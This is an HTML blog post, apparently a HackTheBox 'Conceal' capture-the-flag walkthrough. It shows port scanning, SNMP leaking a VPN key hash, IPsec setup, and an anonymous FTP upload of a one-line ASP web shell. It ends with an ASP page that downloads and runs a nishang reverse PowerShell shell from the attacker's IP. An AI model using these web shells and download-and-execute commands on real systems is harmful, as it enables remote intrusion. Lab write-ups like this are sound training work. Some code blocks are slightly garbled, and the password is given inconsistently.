@@ -1,0 +1,658 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Conceal | Blah blah Recon m4rc0ff@SittingDucks:~$ nmap -sC -sV 10.10.10.116 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-02 14:24 BST Note: Host...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="http://127.0.0.1:8000/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="http://127.0.0.1:8000/theme/css/style.css" type="text/css" media="all">
+
+  
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="http://127.0.0.1:8000/theme/js/functions.min.js"></script>
+
+  <link href="http://127.0.0.1:8000/theme/css/colorbox.css" rel="stylesheet">
+
+  <link href="https://fonts.googleapis.com/css?family=Squada+One|Source+Code+Pro|Merriweather:300|Abril+Fatface" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+  <script src="/theme/tipuesearch/tipuesearch_set.js"></script>
+  <script src="/tipuesearch_content.js"></script>
+  <link rel="stylesheet" href="/theme/tipuesearch/tipuesearch.css">
+  <script src="/theme/tipuesearch/tipuesearch.js"></script>
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Conceal</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation"> 
+	  
+		<form id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
+		<input id="searchbox" type="text" name="q" size="12" placeholder="Search">
+		</form>
+		
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="http://127.0.0.1:8000" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+                <a href="https://twitter.com/M4rC0ff" title="Twitter" >
+<i class="fa fa-twitter fa-lg"></i></a>
+                <a href="https://github.com/M4rc0ff" title="github" >
+<i class="fa fa-github fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="http://127.0.0.1:8000"><img width="310" src="../images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="http://127.0.0.1:8000/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="http://127.0.0.1:8000/tag/hackthebox.html" >HackTheBox (33)</a> &#124; 
+                <a href="http://127.0.0.1:8000/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="http://127.0.0.1:8000/archives.html" >Archives (35)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-06-02 14:33:00+01:00">Tue 02 June 2020</time></span>
+        <h1 class="entry-title"><a href="http://127.0.0.1:8000/Conceal.html">Conceal</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="http://127.0.0.1:8000/Conceal.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <p>Blah blah </p>
+<h1 id="recon">Recon</h1>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> nmap -sC -sV <span class="m">10</span>.10.10.116
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-02 14:24 BST</span>
+<span class="go">Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn</span>
+<span class="go">Nmap done: 1 IP address (0 hosts up) scanned in 3.36 seconds</span>
+</pre></div>
+
+
+<p><code>nmap</code> doesn't show any TCP ports open, at least from the top 1000. Well, I am not that surprised considering the name of the box. Perhaps we will need to look at UDP ports. </p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> sudo nmap -sU <span class="m">10</span>.10.10.116
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-03 07:58 BST</span>
+<span class="go">Nmap scan report for conceal.htb (10.10.10.116)</span>
+<span class="go">Host is up (0.091s latency).</span>
+<span class="go">Not shown: 999 open|filtered ports</span>
+<span class="go">PORT    STATE SERVICE</span>
+<span class="go">500/udp open  isakmp</span>
+
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 157.83 seconds</span>
+</pre></div>
+
+
+<p>It turns out UDP port 500 seems to be open and a quick search on google indicates it's the ISAKMP/IKE port (used by the VPN IPSEC protocol):</p>
+<p><img alt="" src="../images/conceal-port500.png"></p>
+<p>I am not 100% sure port 500 is open because UDP scans are not always reliable. This is because UDP works without aknowlegements. The way it work is that when a port is open the server does not return anything (with some exceptions), but when it is closed the server returns an ICMP packet with an error code (ie, Destination Unreachable). The issue is that if the ICMP packet is not received we don't really know if the port is filtered (ICMP packet filtered by firewall for example) or it's just open. </p>
+<p>The below <a href="https://nmap.org/book/scan-methods-udp-scan.html">figure</a> can probably clarify this better:</p>
+<p><img alt="" src="../images/conceal-nmap.png"></p>
+<p>At this stage I am not fully convinced that's all and I want to try a scan on all 65535 TCP and UDP ports. I decided to do this with <code>masscan</code> which is way faster than <code>nmap</code>.   </p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> sudo masscan -p1-65535,U:1-65535 <span class="m">10</span>.10.10.116 --rate<span class="o">=</span><span class="m">1000</span> -e tun0
+<span class="go">[sudo] password for m4rc0ff: </span>
+
+<span class="go">Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-06-02 13:26:10 GMT</span>
+<span class="go"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth</span>
+<span class="go">Initiating SYN Stealth Scan</span>
+<span class="go">Scanning 1 hosts [131070 ports/host]</span>
+<span class="go">Discovered open port 161/udp on 10.10.10.116</span>
+</pre></div>
+
+
+<p><code>masscan</code> was quite fast in finding port 161 UDP open, that is the default port used by <code>snmp</code>. However, it did not find port 500 so I am still not convinced it's open!</p>
+<p>Trying to find more services details about port 500 and 161 with <code>nmap</code> shows this:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> sudo nmap -p161,500 -sU -sV <span class="m">10</span>.10.10.116                                                                                                                                                 
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-03 08:34 BST</span>
+<span class="go">Nmap scan report for conceal.htb (10.10.10.116)</span>
+<span class="go">Host is up (0.082s latency).</span>
+
+<span class="go">PORT    STATE SERVICE VERSION</span>
+<span class="go">161/udp open  snmp    SNMPv1 server (public)</span>
+<span class="go">500/udp open  isakmp?</span>
+<span class="go">Service Info: Host: Conceal</span>
+
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 114.22 seconds</span>
+</pre></div>
+
+
+<p>This corfirms SNMPv1 is running on the server. This can be of great use as far as enumeration is concerned. </p>
+<p>Let's enumerate further with <code>snmp-check</code>(output too long hence reporting only snippets):</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> snmp-check <span class="m">10</span>.10.10.116                                                         
+<span class="go">snmp-check v1.9 - SNMP enumerator                                                                       </span>
+<span class="go">Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)                                                                                                                                                      </span>
+
+<span class="go">[+] Try to connect to 10.10.10.116:161 using SNMPv1 and community &#39;public&#39;                           </span>
+
+<span class="go">[*] System information:                                                                                 </span>
+
+<span class="go">  Host IP address               : 10.10.10.116                                                                                                                                                                   </span>
+<span class="go">  Hostname                      : Conceal                                                               </span>
+<span class="go">  Description                   : Hardware: AMD64 Family 23 Model 1 Stepping 2 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)</span>
+<span class="go">  Contact                       : IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43                                                                                                                        </span>
+<span class="go">  Location                      : -                                                                                                                                                                              </span>
+<span class="go">  Uptime snmp                   : 05:20:30.53                                                                                                                                                                    </span>
+<span class="go">  Uptime system                 : 05:20:05.77                                                           </span>
+<span class="go">  System date                   : 2020-6-2 14:40:58.6                                   </span>
+<span class="go">  Domain                        : WORKGROUP  </span>
+
+<span class="go">  &lt;SNIP&gt;</span>
+
+<span class="go">[*] TCP connections and listening ports:                                                                                                                                                                         </span>
+
+<span class="go">  Local address         Local port            Remote address        Remote port           State                </span>
+<span class="go">  0.0.0.0               21                    0.0.0.0               0                     listen                                                                                                                 </span>
+<span class="go">  0.0.0.0               80                    0.0.0.0               0                     listen                                                                                                                 </span>
+<span class="go">  0.0.0.0               135                   0.0.0.0               0                     listen                                                                                                                 </span>
+<span class="go">  0.0.0.0               445                   0.0.0.0               0                     listen                                                                                                                 </span>
+<span class="go">  0.0.0.0               49664                 0.0.0.0               0                     listen                                                                                                                 </span>
+<span class="go">  0.0.0.0               49665                 0.0.0.0               0                     listen                                                                                                                 </span>
+<span class="go">  0.0.0.0               49666                 0.0.0.0               0                     listen                                                                                                                 </span>
+<span class="go">  0.0.0.0               49667                 0.0.0.0               0                     listen                                                                                                                 </span>
+<span class="go">  0.0.0.0               49668                 0.0.0.0               0                     listen                                                                                                                 </span>
+<span class="go">  0.0.0.0               49669                 0.0.0.0               0                     listen                                                                                                                 </span>
+<span class="go">  0.0.0.0               49670                 0.0.0.0               0                     listen                                                                                                                 </span>
+<span class="go">  10.10.10.116          139                   0.0.0.0               0                     listen                                                                                                                 </span>
+
+<span class="go">[*] Listening UDP ports:                                                                                                                                                                                         </span>
+
+<span class="go">  Local address         Local port                                                                                                                                                                               </span>
+<span class="go">  0.0.0.0               123                                                                                                                                                                                      </span>
+<span class="go">  0.0.0.0               161                                                                                                                                                                                      </span>
+<span class="go">  0.0.0.0               500                                                                                                                                                                                      </span>
+<span class="go">  0.0.0.0               4500                                                                                                                                                                                     </span>
+<span class="go">  0.0.0.0               5050                                                                                                                                                                                     </span>
+<span class="go">  0.0.0.0               5353                                                                                                                                                                                     </span>
+<span class="go">  0.0.0.0               5355                                                                                                                                                                                     </span>
+<span class="go">  10.10.10.116          137                                                                                                                                                                                      </span>
+<span class="go">  10.10.10.116          138                                                                                                                                                                                      </span>
+<span class="go">  10.10.10.116          1900                                                                                                                                                                                     </span>
+<span class="go">  10.10.10.116          52369                       </span>
+<span class="go">  127.0.0.1             1900                                                                                                                                                                                     </span>
+<span class="go">  127.0.0.1             52370  </span>
+
+<span class="go">  &lt;SNIP&gt;</span>
+</pre></div>
+
+
+<p>We can see a VPN password hash, <code>IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43</code>. The <code>snmp-check</code> result shows other TCP and UDP ports are listening, now I am getting even more why the author chose the box name!</p>
+<p>Port 500 is indeed open and the reason we are not able to see the other open ports when scanning may be because they are "concealed" behind a VPN! </p>
+<p>It is also clear from the output that we are dealing with a Windows box:</p>
+<div class="highlight"><pre><span></span><span class="go">Windows Version 6.3 (Build 15063 Multiprocessor Free) </span>
+</pre></div>
+
+
+<p>Checking on crackstation, we get a hit for the hash:</p>
+<p><img alt="" src="../images/conceal-hash.png"></p>
+<p>The password is <code>Dudecake!</code></p>
+<p>To connect to the VPN through IPSEC we can use a tool called <code>strongswan</code> which is pre-installed in the latest versions of Kali. To get this tool to work we need to add the connection details to a configuration file, <code>/etc/ipsec.conf</code>.</p>
+<p>It took me a while to figure out the details and lot of failed attempts, but <code>man</code> is your friend here. </p>
+<p><code>man ipsec.conf</code> shows few examples and after a while I manage to succed. My conf file looked like this:</p>
+<div class="highlight"><pre><span></span><span class="gp">#</span> ipsec.conf - strongSwan IPsec configuration file
+
+<span class="gp">#</span> basic configuration
+
+<span class="go">config setup</span>
+<span class="go">    charondebug= all</span>
+<span class="go">    strictcrlpolicy=no</span>
+
+<span class="go">conn SittingDucks</span>
+<span class="go">        type=transport</span>
+<span class="go">        keyexchange=ikev1</span>
+<span class="go">        left=10.10.14.21</span>
+<span class="go">        leftprotoport=tcp</span>
+<span class="go">        right=10.10.10.116</span>
+<span class="go">        rightprotoport=tcp</span>
+<span class="go">        authby=psk</span>
+<span class="go">        esp=3des-sha1</span>
+<span class="go">        ike=3des-sha1-modp1024</span>
+<span class="go">        ikelifetime=8h</span>
+<span class="go">        fragmentation=yes</span>
+<span class="go">        auto=add</span>
+</pre></div>
+
+
+<p>Most of the details required can be pulled from the output of <code>ike-scan</code>:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> sudo ike-scan <span class="m">10</span>.10.10.116 -M
+<span class="go">Starting ike-scan 1.9.4 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)</span>
+<span class="go">10.10.10.116    Main Mode Handshake returned</span>
+<span class="go">        HDR=(CKY-R=301538b944d28061)</span>
+<span class="go">        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration(4)=0x00007080)</span>
+<span class="go">        VID=1e2b516905991c7d7c96fcbfb587e46100000009 (Windows-8)</span>
+<span class="go">        VID=4a131c81070358455c5728f20e95452f (RFC 3947 NAT-T)</span>
+<span class="go">        VID=90cb80913ebb696e086381b5ec427b1f (draft-ietf-ipsec-nat-t-ike-02\n)</span>
+<span class="go">        VID=4048b7d56ebce88525e7de7f00d6c2d3 (IKE Fragmentation)</span>
+<span class="go">        VID=fb1de3cdf341b7ea16b7e5be0855f120 (MS-Negotiation Discovery Capable)</span>
+<span class="go">        VID=e3a5966a76379fe707228231e5ce8652 (IKE CGA version 1)</span>
+
+<span class="go">Ending ike-scan 1.9.4: 1 hosts scanned in 0.094 seconds (10.69 hosts/sec).  1 returned handshake; 0 returned notify</span>
+</pre></div>
+
+
+<p><code>man ipsec.secret</code> shows this example:</p>
+<div class="highlight"><pre><span></span># /etc/ipsec.secrets - strongSwan IPsec secrets file
+192.168.0.1 %any : PSK &quot;v+NkxY9LLZvwj4qCC2o/gGrWDF2d21jL&quot;
+</pre></div>
+
+
+<p>so similarly I configure my <code>ipsec.secrets</code> as follow:</p>
+<div class="highlight"><pre><span></span># This file holds shared secrets or RSA private keys for authentication.
+
+# RSA private key for this host, authenticating it to any other host
+# which knows the public part.
+
+%any : PSK &quot;Dudecake1!&quot;
+</pre></div>
+
+
+<p>Even my configuration file looked good when I attempted to connect it was still failing:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> sudo ipsec start
+<span class="go">Starting strongSwan 5.8.4 IPsec [starter]...</span>
+<span class="gp">m4rc0ff@SittingDucks:~$</span> sudo ipsec up SittingDucks
+<span class="go">initiating Main Mode IKE_SA SittingDucks[2] to 10.10.10.116</span>
+<span class="go">generating ID_PROT request 0 [ SA V V V V V ]</span>
+<span class="go">sending packet: from 10.10.14.21[500] to 10.10.10.116[500] (212 bytes)</span>
+<span class="go">received packet: from 10.10.10.116[500] to 10.10.14.21[500] (208 bytes)</span>
+<span class="go">parsed ID_PROT response 0 [ SA V V V V V V ]</span>
+<span class="go">received MS NT5 ISAKMPOAKLEY vendor ID</span>
+<span class="go">received NAT-T (RFC 3947) vendor ID</span>
+<span class="go">received draft-ietf-ipsec-nat-t-ike-02\n vendor ID</span>
+<span class="go">received FRAGMENTATION vendor ID</span>
+<span class="go">received unknown vendor ID: fb:1d:e3:cd:f3:41:b7:ea:16:b7:e5:be:08:55:f1:20</span>
+<span class="go">received unknown vendor ID: e3:a5:96:6a:76:37:9f:e7:07:22:82:31:e5:ce:86:52</span>
+<span class="go">selected proposal: IKE:3DES_CBC/HMAC_SHA1_96/PRF_HMAC_SHA1/MODP_1024</span>
+<span class="go">generating ID_PROT request 0 [ KE No NAT-D NAT-D ]</span>
+<span class="go">sending packet: from 10.10.14.21[500] to 10.10.10.116[500] (244 bytes)</span>
+<span class="go">received packet: from 10.10.10.116[500] to 10.10.14.21[500] (260 bytes)</span>
+<span class="go">parsed ID_PROT response 0 [ KE No NAT-D NAT-D ]</span>
+<span class="go">ENCRYPTION_ALGORITHM 3DES_CBC (key size 0) not supported!</span>
+<span class="go">key derivation for pre-shared key failed</span>
+<span class="go">generating INFORMATIONAL_V1 request 3873670708 [ HASH N(INVAL_KE) ]</span>
+<span class="go">sending packet: from 10.10.14.21[500] to 10.10.10.116[500] (80 bytes)</span>
+<span class="go">establishing connection &#39;SittingDucks&#39; failed</span>
+</pre></div>
+
+
+<p>the error message was <code>ENCRYPTION_ALGORITHM 3DES_CBC (key size 0) not supported!
+key derivation for pre-shared key failed</code> and eventually turns out some additional plugins needed to be installed:</p>
+<ul>
+<li>libstrongswan-standard-plugins</li>
+<li>libstrongswan-extra-plugins</li>
+</ul>
+<p>After installing these plugins 3DES loaded and the connection was successful:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> sudo ipsec up SittingDucks
+<span class="go">initiating Main Mode IKE_SA SittingDucks[1] to 10.10.10.116</span>
+<span class="go">generating ID_PROT request 0 [ SA V V V V V ]</span>
+<span class="go">sending packet: from 10.10.14.21[500] to 10.10.10.116[500] (236 bytes)</span>
+<span class="go">received packet: from 10.10.10.116[500] to 10.10.14.21[500] (208 bytes)</span>
+<span class="go">parsed ID_PROT response 0 [ SA V V V V V V ]</span>
+<span class="go">received MS NT5 ISAKMPOAKLEY vendor ID</span>
+<span class="go">received NAT-T (RFC 3947) vendor ID</span>
+<span class="go">received draft-ietf-ipsec-nat-t-ike-02\n vendor ID</span>
+<span class="go">received FRAGMENTATION vendor ID</span>
+<span class="go">received unknown vendor ID: fb:1d:e3:cd:f3:41:b7:ea:16:b7:e5:be:08:55:f1:20</span>
+<span class="go">received unknown vendor ID: e3:a5:96:6a:76:37:9f:e7:07:22:82:31:e5:ce:86:52</span>
+<span class="go">selected proposal: IKE:3DES_CBC/HMAC_SHA1_96/PRF_HMAC_SHA1/MODP_1024</span>
+<span class="go">generating ID_PROT request 0 [ KE No NAT-D NAT-D ]</span>
+<span class="go">sending packet: from 10.10.14.21[500] to 10.10.10.116[500] (244 bytes)</span>
+<span class="go">received packet: from 10.10.10.116[500] to 10.10.14.21[500] (260 bytes)</span>
+<span class="go">parsed ID_PROT response 0 [ KE No NAT-D NAT-D ]</span>
+<span class="go">generating ID_PROT request 0 [ ID HASH N(INITIAL_CONTACT) ]</span>
+<span class="go">sending packet: from 10.10.14.21[500] to 10.10.10.116[500] (100 bytes)</span>
+<span class="go">received packet: from 10.10.10.116[500] to 10.10.14.21[500] (68 bytes)</span>
+<span class="go">parsed ID_PROT response 0 [ ID HASH ]</span>
+<span class="go">IKE_SA SittingDucks[1] established between 10.10.14.21[10.10.14.21]...10.10.10.116[10.10.10.116]</span>
+<span class="go">scheduling reauthentication in 28063s</span>
+<span class="go">maximum IKE_SA lifetime 28603s</span>
+<span class="go">generating QUICK_MODE request 1730216716 [ HASH SA No ID ID ]</span>
+<span class="go">sending packet: from 10.10.14.21[500] to 10.10.10.116[500] (196 bytes)</span>
+<span class="go">received packet: from 10.10.10.116[500] to 10.10.14.21[500] (188 bytes)</span>
+<span class="go">parsed QUICK_MODE response 1730216716 [ HASH SA No ID ID ]</span>
+<span class="go">selected proposal: ESP:3DES_CBC/HMAC_SHA1_96/NO_EXT_SEQ</span>
+<span class="go">CHILD_SA SittingDucks{1} established with SPIs ce8eebc2_i d846305c_o and TS 10.10.14.21/32[tcp] === 10.10.10.116/32[tcp]</span>
+<span class="go">connection &#39;SittingDucks&#39; established successfully</span>
+</pre></div>
+
+
+<p>Since <code>snmp-check</code> showed some TCP ports open, let's check if these are now visible:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> nmap -sC -sV <span class="m">10</span>.10.10.116
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-03 22:28 BST</span>
+<span class="go">Nmap scan report for conceal.htb (10.10.10.116)</span>
+<span class="go">Host is up (0.079s latency).</span>
+<span class="go">Not shown: 995 closed ports</span>
+<span class="go">PORT    STATE SERVICE       VERSION</span>
+<span class="go">21/tcp  open  ftp           Microsoft ftpd</span>
+<span class="go">|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</span>
+<span class="go">| ftp-syst: </span>
+<span class="go">|_  SYST: Windows_NT</span>
+<span class="go">80/tcp  open  http          Microsoft IIS httpd 10.0</span>
+<span class="go">| http-methods: </span>
+<span class="go">|_  Potentially risky methods: TRACE</span>
+<span class="go">|_http-server-header: Microsoft-IIS/10.0</span>
+<span class="go">|_http-title: IIS Windows</span>
+<span class="go">135/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="go">139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn</span>
+<span class="go">445/tcp open  microsoft-ds?</span>
+<span class="go">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span>
+
+<span class="go">Host script results:</span>
+<span class="go">|_clock-skew: -2m07s</span>
+<span class="go">| smb2-security-mode: </span>
+<span class="go">|   2.02: </span>
+<span class="go">|_    Message signing enabled but not required</span>
+<span class="go">| smb2-time: </span>
+<span class="go">|   date: 2020-06-03T21:27:02</span>
+<span class="go">|_  start_date: 2020-06-03T19:59:04</span>
+
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 40.40 seconds</span>
+</pre></div>
+
+
+<p>Indeed they are!</p>
+<p>The webpage on port 80 shows this:</p>
+<p><img alt="" src="../images/conceal-iis.png"> </p>
+<p>I'll get <code>gobuster</code> started, which finds the <code>upload</code> directory:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> gobuster dir -u http://10.10.10.116 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,txt,asp,aspx
+<span class="go">===============================================================</span>
+<span class="go">Gobuster v3.0.1</span>
+<span class="go">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span>
+<span class="go">===============================================================</span>
+<span class="go">[+] Url:            http://10.10.10.116</span>
+<span class="go">[+] Threads:        10</span>
+<span class="go">[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</span>
+<span class="go">[+] Status codes:   200,204,301,302,307,401,403</span>
+<span class="go">[+] User Agent:     gobuster/3.0.1</span>
+<span class="go">[+] Extensions:     txt,asp,aspx,html</span>
+<span class="go">[+] Timeout:        10s</span>
+<span class="go">===============================================================</span>
+<span class="go">2020/06/03 22:37:30 Starting gobuster</span>
+<span class="go">===============================================================</span>
+<span class="go">/upload (Status: 301)</span>
+<span class="go">/Upload (Status: 301)</span>
+</pre></div>
+
+
+<p>navigating to it we can see it is empty:</p>
+<p><img alt="" src="../images/conceal-upload-empty.png"> </p>
+<p>Since FTP allows anonymous anuthentication, let us see what is inside:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> ftp <span class="m">10</span>.10.10.116
+<span class="go">Connected to 10.10.10.116.</span>
+<span class="go">220 Microsoft FTP Service</span>
+<span class="go">Name (10.10.10.116:m4rc0ff): anonymous</span>
+<span class="go">331 Anonymous access allowed, send identity (e-mail name) as password.</span>
+<span class="go">Password:</span>
+<span class="go">230 User logged in.</span>
+<span class="go">Remote system type is Windows_NT.</span>
+<span class="go">ftp&gt; ls -l</span>
+<span class="go">200 PORT command successful.</span>
+<span class="go">125 Data connection already open; Transfer starting.</span>
+<span class="go">226 Transfer complete.</span>
+<span class="go">ftp&gt;</span>
+</pre></div>
+
+
+<p>the FTP root directory is empty too. Maybe this is not a coincident and the FTP root and the <code>upload</code> directory are linked. We can easily verify that if we can upload things to the FTP.</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/conceal$</span> touch SittingDucks
+<span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/conceal$</span> ftp <span class="m">10</span>.10.10.116
+<span class="go">Connected to 10.10.10.116.</span>
+<span class="go">220 Microsoft FTP Service</span>
+<span class="go">Name (10.10.10.116:m4rc0ff): anonymous</span>
+<span class="go">331 Anonymous access allowed, send identity (e-mail name) as password.</span>
+<span class="go">Password:</span>
+<span class="go">230 User logged in.</span>
+<span class="go">Remote system type is Windows_NT.</span>
+<span class="go">ftp&gt; put SittingDucks</span>
+<span class="go">local: SittingDucks remote: SittingDucks</span>
+<span class="go">200 PORT command successful.</span>
+<span class="go">125 Data connection already open; Transfer starting.</span>
+<span class="go">226 Transfer complete.</span>
+<span class="go">14 bytes sent in 0.00 secs (427.2461 kB/s)</span>
+<span class="go">ftp&gt;</span>
+</pre></div>
+
+
+<p><img alt="" src="../images/conceal-upload-yes.png"> </p>
+<p>The suspecion was correct.</p>
+<p>I then tried to upload an aspx and asp shell to the box, prerespectively <code>/usr/share/laudanum/aspx/shell.aspx</code> and <code>/usr/share/webshells/asp/cmdasp.asp</code> found in Kali but the upload was not successful for some reasons. I also generated two aspx and asp shells with <code>msfvenom</code> but again the FTP put got stuck and never completed. I then searched for "asp shell one liner" on Google and found <a href="https://blog.atucom.net/2015/07/one-line-asp-shell.html">this</a>:</p>
+<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="k">%</span><span class="n">response</span><span class="p">.</span><span class="nb">write </span><span class="n">CreateObject</span><span class="p">(</span><span class="s2">&quot;WScript.Shell&quot;</span><span class="p">).</span><span class="n">Exec</span><span class="p">(</span><span class="n">Request</span><span class="p">.</span><span class="n">QueryString</span><span class="p">(</span><span class="s2">&quot;cmd&quot;</span><span class="p">)).</span><span class="n">StdOut</span><span class="p">.</span><span class="n">Readall</span><span class="p">()%&gt;</span>
+</pre></div>
+
+
+<p>I saved this on a file named <code>cmd.asp</code> and it got uploaded successfully. To verify it works I browse to the shell and add <code>?cmd-whoami</code>:</p>
+<p><img alt="" src="../images/conceal-whoami.png"></p>
+<p>Now that we verified code execution we can use it to call a proper shell instead of running <code>whoami</code>. So I copy a nishang shell to my directory:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/conceal$</span> cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1
+<span class="go">ye```</span>
+
+<span class="go">and I add the following string at the very bottom of the powershell script:</span>
+
+<span class="go">```powershell</span>
+<span class="go">Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.21 -Port 443</span>
+</pre></div>
+
+
+<p>where 10.10.14.21 is the IP of my kali box. Then I host the shell.ps1 on a python SimpleHTTPServer, I setup a netcat listener on port 443, and I modify the content of the asp shell as follows:</p>
+<div class="highlight"><pre><span></span><span class="p">&lt;%</span>
+<span class="nb">Set </span><span class="n">rs</span> <span class="p">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s2">&quot;WScript.Shell&quot;</span><span class="p">)</span>
+<span class="nb">Set </span><span class="n">cmd</span> <span class="p">=</span> <span class="n">rs</span><span class="p">.</span><span class="n">Exec</span><span class="p">(</span><span class="s2">&quot;cmd /c powershell -c iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.21/shell.ps1&#39;)&quot;</span><span class="p">)</span>
+<span class="n">o</span> <span class="p">=</span> <span class="n">cmd</span><span class="p">.</span><span class="n">StdOut</span><span class="p">.</span><span class="n">Readall</span><span class="p">()</span>
+<span class="n">Response</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">o</span><span class="p">)</span>
+<span class="p">%&gt;</span>
+</pre></div>
+
+
